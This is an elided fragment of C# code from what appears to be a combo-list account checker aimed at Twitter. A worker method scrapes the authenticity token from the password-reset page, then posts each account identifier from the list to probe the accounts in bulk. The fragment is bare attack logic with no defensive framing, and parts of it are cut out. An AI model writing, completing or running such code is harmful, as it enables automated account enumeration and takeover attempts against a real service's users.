        ...
        static void Worker(string combo)
        {
            try
            {
                ...
                })
                {
                    ...
                    string pre = req.Get("https://twitter.com/account/begin_password_reset").ToString();

                    var TOK = Functions.LR(pre, "name=\"authenticity_token\" value=\"", "\">").FirstOrDefault();


                    var res0 = req.Post("https://twitter.com/account/begin_password_reset", $"authenticity_token={TOK}&account_identifier={WebUtility.UrlEncode(credentials[0])}", "application/x-www-form-urlencoded");
